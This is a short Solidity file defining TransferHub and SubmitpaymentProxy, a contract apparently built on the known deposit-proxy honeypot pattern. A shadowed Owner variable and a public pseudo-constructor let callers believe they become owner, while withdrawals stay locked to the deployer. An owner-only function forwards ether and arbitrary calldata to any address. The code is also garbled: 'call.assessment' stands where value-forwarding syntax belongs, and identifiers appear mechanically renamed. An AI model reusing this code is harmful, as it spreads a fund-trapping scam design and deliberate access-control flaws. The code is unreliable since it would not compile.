// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract TransferHub  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function moverecordsDirector(address _owner) public onlyOwner { Owner = _owner; }
    function referralGate(address goal, bytes chart) public payable {
        goal.call.assessment(msg.value)(chart);
    }
}

contract SubmitpaymentProxy is TransferHub {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function SpecimenBank() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            submitPayment();
        }
    }

    function submitPayment() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function claimCoverage(uint256 measure) public onlyOwner {
        if (measure>0 && Deposits[msg.sender]>=measure) {
            msg.sender.transfer(measure);
        }
    }
}